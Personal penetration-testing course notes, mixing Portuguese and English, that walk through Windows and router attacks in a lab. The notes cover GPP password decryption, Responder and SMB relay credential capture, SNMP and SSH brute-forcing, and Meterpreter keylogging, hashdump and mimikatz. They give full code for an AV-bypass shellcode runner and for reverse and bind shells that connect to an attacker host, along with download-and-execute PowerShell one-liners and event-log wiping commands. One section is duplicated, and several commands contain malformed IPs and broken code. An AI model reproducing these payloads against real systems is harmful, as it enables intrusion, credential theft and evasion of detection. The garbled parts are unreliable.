     f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
	 
Para descriptografar podemos utilizar o script:
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

ou no kali linux temos
gpp-decrypt chave_encrypt

tem um módulo no MSF que já baixa e descritpografa
msf> use exploit/multihandler
msf> use post/windows/gather/credentials/gpp
msf> show options

Como o anti-vírus funciona?

Shellcode Execution - SCE
=========================
SCEPWN-NG by @joshuaskorich
https://github.com/joshuaskorich/scepwn-ng

. Using a samba share you can execute the binary directly from the sharing folder injecting the meterpreter session directly
on memory without any file ever touch the disck!
. Details of how configure the enviroment on scepwn-ng github.
. After configure your enviroment, and get a privileged account, just execute:
	. ./scepwn-ng.rb -u 'usernam%password_or_hash' -t TARGET
. If you put this command in a loop to read from a list of targets and use a Meterpreter script to automatize commands on 
targets, it becomes a mass auto-pwd tool.


Muito efetivo e bypass anti-vírus.
. Works beautifully using winexe or psexec (God bless the  Pass the Hash :-)
. Using a Domain Admin account is possible automatize the Mass p0wn4g3 on the network "scripting" the 
command reading the targets from a list.
. Using a Meterpreter script you can also automatize the capture of evidences on all compromised machines
screenshot, ifconfig, hashdump, mimikatz, getinfo, etc...

. Using Microfot Powershell is possible download the binary (wget like style) to a temporary directory, execute 
it erase the file after:
  .  On attacker machine execute:
  python -m SimpleHTTPServer
  winexe --user=DOMAIN\USER%HASH_OR_PASSWORD //TARGET "cmd /c \"del teste.bat & echo powershell -c 
  \("new-object System.Net.WebClient).DownloadFile('http://YOUR_MACHINE:8000/sce.32.exe', 'sce.32.exe')\" >> 
  teste.bat & echo powershell -c \"(new-object System.Net.WebClient).DownloadFile('YOUR_MACHINE/hack.bat', 
  'hack.bat')\" >> teste.bat & echo hack.bat >> teste.bat & teste.bat\""

https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc


Enumeration Techniques
======================
telnet www.alvo.com.br 80
HEAD / HTTP/1.1

whois www.alvo.cam.br

dig @ns1.alvo.com.br alvo.com.br axfr
dig @ns1.alvo.com.br version.bind txt chaos 

no windows
> net view \\192.168.1.1

> net help

Tunneling and Pivoting
======================

ssh well1@192.168.1.1 -L2300:localhost:23

em outro terminal
telnet localhost 2300


hts

http://www.http-tunnel.com/html/

Privilege Escalation
====================

nmap -sS -O 192,168,1,1


Enumeration enum4linux
======================

 Acessar o help
# enum4linux -h

Enumerar usuários
# enum4linux -U 192.168.1.1

Enumerando Máquinas
# enum4linux -M 192.168.1.2

Enumerando compartilhameentos
# enum4linux -S 192.168.1.2

Enumerando politicas de senhas
# enum4linux -P 192.168.1.2

Enumerando Gropos
# enum4linux -G IP

Enumerando NetBIOS
# enum4linux -n IP


Null Session IPS$
=================

> net use \\192.168.1.1\ips$ "" "/user:"

> cd enum

https://packetstormsecurity.com/files/download/16272/winfo.exe

> winfo.exe

> winfo.exe 192.1668.1.1 -n -v

> net use \\192.168.1.1 /delete

| SRV |  <------ Client
^		NTLMv2
|
+----- hacker

# msfpayload -p windows\meterpreterreverse_tcp LHOST=192.1668.1.111 LPORT=4444 X > smb_rev.exe
# msfconsole
msf> use exploit/multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> LHOST 192.168.1.111
msf> LPORT 4444
msf> exploit
msf> 
msf> 
msf> 
msf> 

https://github.com/CoreSecurity/impacket
https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py

# python smbrelayx.py -h 192.168.1.1 -e ./smb_rev.exe

no servidor windows 
\\192.1668.1.1\

  
Responder
=========

LLMNR - Link-Local Multicast Name Resolution
NBT-NS - NetBIOS Name Server

Client wants to look up a hostname
1.	Checks local hosts file first
2.	Does a DNS query
3.	Use LLMNR/NBT-NS to send out broadcast/multicast message to the network

LLMNR supports IPv6; NBT-NS onlu supports IPv4.

\\fileserver\

Help do Responder
# responde -h

# responder -I eth0 (-I = Interface)
ou
# reponder -i 192.168.1.1 (-i IP Address)

Cenário Windows XP e Windows Server 2012 DC

# responder -I eth0 

List Content

No windows xp Windows+R
\\win12-dc1\ <-- Não existe

Ele cria no diretorio logs arquivos do que foi colhido
Outro terminal podemos fazer bruteforce
# john file_log_responder.txt


Trafego WPAD Proxy
# responser -I eth0 -wrFb

no windows xp abra o ie e digite um endereço como http://www.microsft.com
o prompt de login irá aparecer, como se tivessimos um proxy autenticado.

Após inserir as credenciais o site é liberado
e o usuário e senha são capturados.

https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc


Enumeration Techniques
======================
telnet www.alvo.com.br 80
HEAD / HTTP/1.1

whois www.alvo.cam.br

dig @ns1.alvo.com.br alvo.com.br axfr
dig @ns1.alvo.com.br version.bind txt chaos 

no windows
> net view \\192.168.1.1

> net help

Tunneling and Pivoting
======================

ssh well1@192.168.1.1 -L2300:localhost:23

em outro terminal
telnet localhost 2300


hts

http://www.http-tunnel.com/html/

Privilege Escalation
====================

nmap -sS -O 192,168,1,1


Enumeration enum4linux
======================

 Acessar o help
# enum4linux -h

Enumerar usuários
# enum4linux -U 192.168.1.1

Enumerando Máquinas
# enum4linux -M 192.168.1.2

Enumerando compartilhameentos
# enum4linux -S 192.168.1.2

Enumerando politicas de senhas
# enum4linux -P 192.168.1.2

Enumerando Gropos
# enum4linux -G IP

Enumerando NetBIOS
# enum4linux -n IP


Null Session IPS$
=================

> net use \\192.168.1.1\ips$ "" "/user:"

> cd enum

https://packetstormsecurity.com/files/download/16272/winfo.exe

> winfo.exe

> winfo.exe 192.1668.1.1 -n -v

> net use \\192.168.1.1 /delete

| SRV |  <------ Client
^		NTLMv2
|
+----- hacker

# msfpayload -p windows\meterpreterreverse_tcp LHOST=192.1668.1.111 LPORT=4444 X > smb_rev.exe
# msfconsole
msf> use exploit/multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> LHOST 192.168.1.111
msf> LPORT 4444
msf> exploit
msf> 
msf> 
msf> 
msf> 

https://github.com/CoreSecurity/impacket
https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py

# python smbrelayx.py -h 192.168.1.1 -e ./smb_rev.exe

no servidor windows 
\\192.1668.1.1\

-=-=-=-=-=--=-===-=-=-=-
Curso Vivek - Pen-Test Infra
============================

Aula 02 e 3
-----------

Pentest em roteadores.

Attacking Administrative Services
. SSH, Telnet
. HTTPD
. SNMP

Routing Attacks
. RIP
. OSPF
. BGP

Download Vyatta - Free comuunity edition
http://vyatta.org/downloads

Download ISO
Instalar a imagem

$ install image
selecion as opções adequadas

usuário e senha é vyatta

$ reboot

$ show configuration

$ configure

$ set interface ethernet eth0 address 192.168.5.254/24

$ commit

$ save

$ show interfaces

$ exit

$ reboot

user: vyatta
pass: vyatta

$ configure

$ set service ssh
$ set service telnet
$ set service https
$ set service snmp community public authorization ro
$ set service snmp community private authorization rw

$ commit
$ save

no kali
-------
# nmap -sV -n 192.168.5.254
...
22
23
80
443
...

# nc 192.168.5.254 23
Acesse a página web
http://192.168.5.254


# nmap -sU -p 161 -n -sV 192.168.5.254
...
161
...

Rodar os scripts do NMap
# nmap -sU -p 161 -n -sV -sC 192.168.5.254


$ delete service snmp community public
$ set service snmp community public2 authorization ro
$ commit
$ save

# nmap -sU -p 161 -n -sV -sC 192.168.5.254
Não retorna na da porque o script utiliza a comunidade default que é public

Aula 04
-------

Atacando serviços em roteadores

Brute-Force em SSH

$ configure
$ set system login user admin authentication plaintext-password zeus
$ commit
$ save

Gerar wordlist-leak01

# crunch 4 4 azeious > words.txt

# com o Metasploit
msf> use auxiliary/scanner/ssh/ssh_login
msf> show options
msf> set RHOST 192.168.5.254
msf> set BLANK_PASSWORDS false
msf> set PASS_FILE /root/words.txt
msf> set STOP_ON_SUCESS true
msf> set TRHEADS 20
msf> set USERNAME admin
msf> run

# hydra -l admin -P words.txt 192.168.5.254 ssh

# ncrack -v -T 5 --user admin -P words.txt 192.168.5.254:22 <-- deu erro na apresentação dele.

Para ver quais protocolos a medusa suporta
# medusa -d

# medusa -h 192.168.5.254 -u admin -P words.txt -M ssh

Aula 05
-------

Configurando o SNMP para ser atacado

$ delete service snmp community public2
$ delete service snmp community private
$ set service snmp community zeus authorization ro
$ commit
$ save

# nmap -sU -n -p 161 --script snmp-brute 192.168.5.254 --script-args snmp-brute.communitiesdb=words.txt

# com o Metasploit
msf> use auxiliary/scanner/snmp/snmp_login
msf> show options
msf> set RHOST 192.168.5.254
msf> set BLANK_PASSWORDS false
msf> set PASS_FILE /root/words.txt
msf> set STOP_ON_SUCESS true
msf> set TRHEADS 20
msf> set USERNAME admin
msf> run

# wireshark &
filter snmp

registro error-status: noError

# medusa -M snmp -h 192.168.5.254 -u admin -P words.txt

Aula 06
-------

http://routerpasswords.com

pegue as senhas defaults para podemos fazer o brute-force web no router.

Inicie o Burp

coloque o proxy do seu browser como o burp

Acesse a página de autenticação coloque qualquer usuário e senha

ná página de enviada com usuários e senha na guia Raw clique com bt.dir aponte para
Send to intruder

Na guia Positions vai no campo Authorization: Basic YerERtrSfeGer <-- selecione

clique no botão Add §

Agora clique na guia Payloads, em Payload type: Numbers
Type: Sequencial
from: 100
to: 130
step: 1

Agora em Payload Processing
clique em Add

Selecione Add prefix
Prefix: admin:

Clique em Add novamente
Selecione Encode e Base64-encode

Olhe o Status diferente de 401
espere por um 200

Clique no retorno 200 OK clique com o bt.dir no dado encodado e aponte para Send to Decoder

clique na guia Decoder
em decode as selecione base64

e no botão smart decode

Aula 07
-------

SNMP-Walking

# snmpwalk -v1 -c router-write 192.168.5.254

# snmpwalk -v1 -c router-write 192.168.5.254 > snmp_dump_file

# snmpset -v1 -c router-write 192.168.5.254 iso.3.6.1.2.1.1.5.0 s Hacked
iso.3.6.1.2.1.1.5.0 = STRING: "Hacked"

# snmpwalk -v1 -c router-write 192.168.5.254 > snmp_dump_file2

Aula 8
------

# onesixtyone -c words.txt 192.168.5.254

# snmpcheck -c zeus -t 192.168.5.254

# com o Metasploit
msf> use auxiliary/scanner/snmp/snmp_enum
msf> show options
msf> set RHOST 192.168.5.254
msf> set COMMUNITY zeus
msf> run

$ configure
$ set service snmp community zeuz autorization rw
$ commit
$ save

# com o Metasploit
msf> use auxiliary/scanner/snmp/snmp_set
msf> show options
msf> set RHOST 192.168.5.254
msf> set COMMUNITY zeuz
msf> set OID 3.6.1.2.1.1.5.0
msf> set OIDVALUE Demo
msf> run

# snmptranslate -On iso.3.6.1.2.1.1.5.0

Aula 9
------

# braa zeuz@192.168.5.254:161:.1.3.6.1.*
vai listar tudo que começa com o 1.3.6.1.

para ver as tools de snmp vai na interface grafica do kali clique em Application->Kali Linux->Information Gathering->SNMP Analysis

para ver os scripts do nmap vai em /usr/share/nmap/scripts/
# cd /usr/share/nmap/scripts/
# ls *snmp*

# nmap -sU -sV -p 161 -n 192.168.5.254 --script="snmp-interfaces" --script-args="snmpcommunity=zeuz"
# nmap -sU -sV -p 161 -n 192.168.5.254 --script="netstat" --script-args="snmpcommunity=zeuz"
# nmap -sU -sV -p 161 -n 192.168.5.254 --script="snmp-processes" --script-args="snmpcommunity=zeuz"
# nmap -sU -sV -p 161 -n 192.168.5.254 --script="snmp-sysdescr" --script-args="snmpcommunity=zeuz"


Aula 10
-------

Ambiente de teste

. Endpoints - Laptops, workstations, phones
. Servers - Web Servers and other services (Email Servers, File Servers, etc.)
. Enterprise Environments - Domain Controllers, AD, etc.

Exploit BadBlue 2.72b - PassThru Buffer Overflow

Exploit e executável
http://www.exploit-db.com/exploits/16806

# com o Metasploit
msf> search badblue
msf> use exploit/windows/http/badblue_pasthru
msf> set RHOST 192.168.5.130
msf> set RPORT 80
msf> exploit
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getpid
meterpreter> ps
meterpreter> migrate 2448

Aula 12
-------

Software Misconfiguration

. Allowing RDP for all accounts
 - Weak User: Pass for even SINGLE account
. No account lockout policy
. Using Default port for DP 3389

Habilitar o RDP no Windows 7

# nmap -sV -p3389 -n 192.168.5.130
# ncrack -U wordlist-user -P wordlist-pass -p rdp 192.168.5.130

depois exeute o acesso via TS

Mostra todos os payloads
# msfvenom -l paylods

selecionando o paylload e mostrat as opções
# msfvenom -p windows/meterpreter/bind_tcp -o 

# msfvenom -p windows/meterpreter/bind_tcp -a x86 -f exe > bind_shell.exe
# file bind_shell.exe
# mkdir trojan
# cp bind_shell trojan/
# cd trojan
# python SimplesHTTPServer

Baixe e execute no alvo

msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/bind_tcp
msf> exploit

Bypass Firewall
---------------

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.5.131 LPORT=444 -a x86 -f exe > reverse_shell.exe
# file reverse_shell.exe
# mkdir trojan
# cp reverse_shell trojan/
# cd trojan
# python SimplesHTTPServer

msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reebind_tcp
msf> set LHOST 192.168.5.131
msf> set LPORT 4444
msf> exploit

Baixe e execute no alvo

Bypass Firewall Enterprise
--------------------------

No Windows 7 crie uma regra de outbound que libere 1 porta e bloqueie todas as outras


# msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.5.131 LPORT=443 -a x86 -f exe > https_shell.exe
# file https_shell.exe
# mkdir trojan
# cp https_shell trojan/
# cd trojan
# python SimplesHTTPServer

msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_https
msf> set LHOST 192.168.5.131
msf> set LPORT 443
msf> exploit

Baixe e execute no alvo

para opçõs avançadas leio o blog
https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication


Detectando automaticamente quais portas estão abertas no Firewall Enterprise
----------------------------------------------------------------------------

No Windows 7 crie uma regra de outbound que libere 1 porta e bloqueie todas as outras
mude a porta para uma outra qualquer


# msfvenom -p windows/meterpreter/reverse_tcp_allports LHOST=192.168.5.131 LPORT=4444 -a x86 -f exe > allport_shell.exe
# file https_shell.exe
# mkdir trojan
# cp allport_shell trojan/
# cd trojan
# python SimplesHTTPServer

# iptables --flush
# iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 44:4444 -j DNAT --to-destination 192.168.5.131:4444

msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp_allport
msf> set LHOST 192.168.5.131
msf> set LPORT 4444
msf> exploit

Baixe e execute no alvo

Port Forwarding
---------------

Atraz do Windows 7 tem outra máquina que não acessamos diretamentecrie
Metasploitable2

# nmap -sV -n 172.16.30.20

msf> search badblue
msf> use exploit/windows/http/badblue_pasthru
msf> set RHOST 192.168.5.130
msf> set RPORT 80
msf> exploit
meterpreter> ps
meterpreter> migrate 3028 <-- explorer
meterpreter> ipconfig
meterpreter>  run arp_scanner -r 172.16.30.1-255
meterpreter> portfwd add -l 8000 -p 80 -r 172.16.30.20

# nmap -sV -n -p 8000 localhost

no browser

http://localhost:8000

Pivoting
--------

http://localhost:8000/multilliae/?

http://localhost:8000/multilliae/?-s

meterpreter> ipconfig
meterpreter>  run arp_scanner -r 172.16.30.1-255
meterpreter> portfwd add -l 8000 -p 80 -r 172.16.30.20
meterpreter>  background <-- Session 1
msf> search php_cgi_arg
msf> route add 172.16.30.0 255.255.255.0 1
msf> use exploit/multi/http/php_cgi_arg_injection
msf> set RHOST 172.16.30.20
msf> set PAYLOAD php/meterpreter/bind_tcp
msf> exploit
meterpreter> sysinfo
meterpreter> getuid
meterpreter>  ls
meterpreter>  background <-- Session 2

Reverse Pivots
--------------

msf> use exploit/multi/http/php_cgi_arg_injection
msf> set RHOST 172.16.30.20
msf> set PAYLOAD php/meterpreter/reverse_tcp
msf> set LHOST 172.16.30.10
msf> exploit

AV Bypass using Python
----------------------

Python to EXE
. Pyinstaller
http://www.pyinstaller.org/

PyInstaller Quickstart
Install PyInstaller from PyPI:

pip install pyinstaller
Go to your program’s directory and run:

pyinstaller yourprogram.py

This will generate the bundle in a subdirectory called dist.

For a more detailed walkthrough, see the manual. -> https://pyinstaller.readthedocs.io/en/stable/


Python Script to Lounch Shellcode

Pyinstaller Win32 Shellcode Runner

http://pastebin.com/rrhcGeHh

# msfvenom -p windows/meterpreter/reebind_tcp LHOST=192.168.5.131 LPORT=53 -a x86 -f c

Copie e cole o rsultado no shellcode do script a seguir

# vi avbypass.py
#!/usr/bin/python
 
##############################################################
# PyInstaller Win32 shellcode runner - by @mihi42
#
# Needed software:
# * Python 2.7.2 from
#   <http://www.python.org/download/releases/>
# * PyWin32 build 217 for Python 2.7 from
#   <http://sourceforge.net/projects/pywin32/files/pywin32/>
# * PyInstaller 1.5.1 from <http://www.pyinstaller.org/>
#
# Usage:
# * Install and configure the software above
# * Replace the shellcode below if desired (use output type
#   for C and change the first and last line)
# * Run PyInstaller to build an EXE file, using the switches
#   -w -a -F (and maybe more if you prefer)
##############################################################
# windows/meterpreter/reverse_tcp - 290 bytes (stage 1)
# Gere um novo PAYLOAD com o msfvemon
shellcode = bytearray(
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
"\x05\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10"
"\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
"\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
"\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
"\x85\xf6\x75\xec\xc3"
)
##############################################################
 
import ctypes
 
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40))
 
ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
    ctypes.c_int(len(shellcode)))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
    buf,
    ctypes.c_int(len(shellcode)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
    ctypes.c_int(-1))
	
ESC:wq

# python -m SipleHTTPServer
baixe para o Windows o script avbypass.py

C:\> pyinstaller.py -w -a -F ..\..\avbypass.py
Gera o executável avbypass.exe

msf> use exploit/multi/handler
msf> set PAYLOAD php/meterpreter/reverse_tcp
msf> set LHOST 192.168.5.131
msf> set LPORT 53
msf> exploit

Execute o bypass.exe

e a sessão é criada.

Escalation Priv UAC ByPass in Win7
----------------------------------

meterpreter> getuid
user-common
meterpreter> hashdump
not permission
meterpreter> getsystem
error
meterpreter> exit
msf> exploit
meterpreter> ps
meterpreter> migrate 2760
meterpreter> background
msf> use exploit/windwos/local/bypassuac
msf> show options
msf> session -l
msf> set SESSION 2
msf> show options
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.5.131
msf> exploit
meterpreter> getuid
user-common
meterpreter> getsystem
meterpreter> hashdump
meterpreter> run post/windows/gather/smart_hashdump

Hash Dump and Mimikatz
----------------------

msf> exploit
meterpreter> getuid
user-common
meterpreter> getsystem
meterpreter> getuid
user-system
meterpreter> load mimikatz
meterpreter> ?
meterpreter> wdigest

meterpreter> run post/windows/gather/smart_hashdump
Gera um arquivo dos hashes capturado.

# cat /root/.msf4/loot/.../IP.txt

meterpreter> hushdump
error
meterpreter> ps
meterpreter> migrate 612 <-- lsass.exe
meterpreter> hushdump
dump users
meterpreter> 

Aula 23
-------

meterpreter> ifconfig
meterpreter> route
meterpreter> netstat
meterpreter> execute -f cmd -H -c -i
c:\> exit

meterpreter> use sniffer
meterpreter> ?
meterpreter> sniffer_interfaces
meterpreter> sniffer_start 2 5000
meterpreter> sniffer_stats 2
meterpreter> sniffer_dump 2 sniffer_net-192.168.5.130.pcap

meterpreter> sniffer_stop 2

# wireshark sniffer_net-192.168.5.130.pcap &

Aula 24
-------
. Session
 - Single user's logon session
. Stations
 - Security boundary to contain destops + processes
. Desktops
 - GUI objects allocated
http://blogs.technet.com/b/askperf/archive/2007/07/24/sessions-destops-and-windows-stations.apsx
http://www.brianbondy.com/blog/id/100/

Session 0
 |---> WinSta0 (interactive window station)
 |        |-> Default (desktop)
 | 		  |-> Disconnect (desktop)
 |		  |-> Winlogon (desktop)
 |
 |---> Service 0x0-3e7$ (No interactive window station)
 |         |-> Default (desktop)
 |
 |---> Service 0x0-3e4$ (No interactive window station)
 |         |-> Default (desktop)
 |
 |---> SAWinSta (No interactive window statioon)
           |-> Default (desktop)

Download WinObj

Session 

meterpreter>  getdesktop
Session 1\WinSta0\Default

meterpreter> use espia
meterpreter>  ?

Stdapi: User interface commands

meterpreter>  enumdesktops

meterpreter> keyscan_start
meterpreter> keyscan_dump
meterpreter> keyscan_stop

Forçar o usuário reiniciar a máquina parando o teclado e mouse
meterpreter> uictl
meterpreter> uictl disable keyboard
meterpreter> uictl disable mouse

meterpreter> uictl enable keyboard
meterpreter> uictl enable mouse

meterpreter> screenshot

Impersonation
-------------


msf> session -l

id
1
2

msf> session -i 2
meterpreter> getuid
user-common
meterpreter> load incognito
meterpreter> list_tokens
meterpreter> list_tokens -u
No tokens available

meterpreter> background

msf> session -i 1
meterpreter> getuid
user-system
meterpreter> load incognito
meterpreter> list_tokens -u
local service
network service
system

meterpreter> ?
meterpreter> impersonate_token
meterpreter> list_tokens -u
meterpreter> getuid
meterpreter> impersonate_token how2sec\\welltom

meterpreter> guetuid
user-welltom

meterpreter> execute -f cmd.exe -c -i -H
c:\> whoami

senha para wordlist
exp251|vitinhu123

Logs wevtutil
-------------

Ferramenta da microsoft para gerenciar log na linha de comando WevtUtil.exe

Serve para apagarmos rastros
http://technet.microsoft.com/en-us/library/cc732848.aspx

meterpreter> execute -f cmd.exe -c -i -H
c:\> wevtutil /?

Listar todos os logs
c:\> wevtutil el

Status do security log
c:\> wevtutil gli Security

Ver as entradas de logs (vai mostrar de três em três logs)
c:\> wevtutil qe Security /c:3 /rd:true /f:text

Exportado o log
c:\> wevtutil epl Security c:\sec.evtx

Apagar e fazer backup
c:\> wevtutil cl Security /bu:c:\SecLogBkp.vtx

Só apagando basta utilizar o cl
c:\> wevtutil cl Security
c:\> wevtutil gli Security

Post Exploitation WMIC
----------------------

meterpreter> execute -f cmd.exe -c -i -H
c:\> wmic /?
olhe o tanto de opções para explorar

listando os usuários
c:\> wmic useraccount list

c:\> wmic process get Name,ProcessId

c:\> wmic process list brief

Programa que iniciam com a máquina - podemos achar os endpoint protection av/ids/ips
c:\> wmic startup list brief

Nome dos produtos instalados
c:\> wmic product get Name,Vendor

Listando os compartilhamento
c:\> wmic share list

listar groups
c:\> wmic group list brief

Custom Connect Shell Bacdoor
----------------------------

Metasplit based payloads
. High rate of detection by AV
. Changes probably closely monitored by AV companies
. Custom code is difficult to fingerprint and beat!!!

Reference: David Kennedy
https://www.trustedsec.com/files/simple_py_shell.py

# vi simple_py_shell.py

#!/usr/bin/python
# imports here
# Copyright 2012 TrustedSec, LLC. All rights reserved. 
#
# This piece of software code is licensed under the FreeBSD license..
#
# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information. 
import socket,subprocess
HOST = '172.16.32.137'    # The remote host
PORT = 443            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.send('[*] Connection Established!')
# start loop
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()

vamos modificar para ficar assim:
# vi simple_py_shellv2.py
#!/usr/bin/python
# imports here
# Copyright 2012 TrustedSec, LLC. All rights reserved. 
#
# This piece of software code is licensed under the FreeBSD license..
#
# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information. 
import socket,subprocess
HOST = '172.16.32.137'    # The remote host
PORT = 443            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.send('[*] Connection Established!')
# start loop
data = s.recv(1024)
while data:
     try:
        output = subprocess.check_output(data, shell=True)
		s.send(output)
	 except:
	    pass
	 data = s.recv(1024)

# close socket
s.close()

agora vamos no windows utilizar o pyinstaller.py para transformar de python para PE

c:\> pyinstaller.py -F ../simple_py_shellv2.py

# nc -l -p 443 -v

dir
whoami

https://github.com/trustedsec/
https://www.exploit-db.com/exploits/19091/
https://www.exploit-db.com/exploits/19092/
https://github.com/trustedsec/hash_parser
https://github.com/trustedsec/ridenum

BindShell
---------

# vi bind_py_shellv2.py
#!/usr/bin/python

import socket,subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.bind(("0.0.0.0", 8080))
s.listen(1)

client_sock, client_addr = sock.accept()

data = client_scok.recv(512)

data = s.recv(1024)
while data:
     try:
        output = subprocess.check_output(data, shell=True)
		client_sock.send(output)
	 except:
	    pass
	 data = client_sock.recv(1024)

# close socket
client_socks.close()
s.close()

agora vamos no windows utilizar o pyinstaller.py para transformar de python para PE

c:\> pyinstaller.py -F ../bind_py_shellv2.py

# nc -v 192.168.5.130 8080

dir
whoami

Hide BindShell
--------------
Reference: Borja Merino

http://www.shelliscoming.com/2014/03/hidden-bind-shell-keep-your-shellcode.html

 push 0x1                    ; size, in bytes, of the buffer pointed to by the "optval" parameter
  push esp                   ; optval: pointer to the buffer in which the value for the requested option is specified 
  push 0x3002                ; level at which the option is defined: SOL_SOCKET
  push 0xFFFF            	 ; the socket option: SO_CONDITIONAL_ACCEPT
  push edi                   ; socket descriptor
  push 0x2977A2F1    		 ; hash( "ws2_32.dll", "setsockopt" )
  call ebp                   ; setsockopt(s, SOL_SOCKET, SO_CONDITIONAL_ACCEPT, &bOptVal, 1 );
  
  push ebx                   ; backlog
  push edi                   ; socket
  push 0xFF38E9B7     		 ; hash( "ws2_32.dll", "listen" )
  call ebp                   ; listen( s, 0 );
      
condition:
  push ebx                   ; dwCallbackData (ebx = 0, no data needed for the condition function)
  call wsaaccept             ; push the start of the condition function on the stack
  mov eax, DWORD [esp 4]    
  mov eax, DWORD [eax 4]   
  mov eax, DWORD [eax 4]  	 ; get the client IP returned in the stack
  sub eax, 0x2101A8C0        ; compare the client IP with the IP allowed
  jz return                  ; if equal returns CF_ACCEPT
  xor eax, eax               ; If not equal, the condition function returns CF_REJECT
  inc eax
return:
  retn 0x20                  ; some stack alignment needed to return to mswsock
  
wsaaccept:
  push ebx                   ; length of the sockaddr = nul
  push ebx                   ; struct sockaddr = nul
  push edi                   ; socket descriptor
  push 0x33BEAC94       	 ; hash( "ws2_32.dll", "wsaaccept" )
  call ebp                   ; wsaaccept( s, 0, 0, &fnCondition, 0)
  cmp eax, -1                ; if error jump to condition function to wait for another connection
  jz condition
   
Its use will be exactly the same as the ACL Bind Shell. We will use the AHOST variable to specify the IP that will have visibility to the shellcode. For example, to make the shellcode accessible only from the IP 192.168.1.200 we would run msfvenom as follows:

# msfvenom -p windows/shell_hidden_bind_tcp LPORT=9999 AHOST=192.168.5.131 -f exe > hidden_shell.exe

# nmap -sS -n -v 192.168.5.130 -p 9999
9999/tcp	open

isso porque estamos na máq 192.168.5.131

se mudarmos o ip ele não irá aparecer
# ifconfig eth0 192.168.5.111 up
# nmap -sS -n -v 192.168.5.130 -p 9999
9999/tcp	close

# nc 192.168.5.130 9999

https://www.youtube.com/watch?v=xYBuaVNQjGA

Bitsadmin - Windows endpoint
----------------------------

Download file on the victim from the web
upload wget
script in vbs/powershell

Bitsadmin
configure Download and upload jobs
works in batch mode
supported natively on windows 7

http://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx

Criando Job
c:\> bitsadmin /create /doanload hackerjob

Adicionando os arquivos ao Job
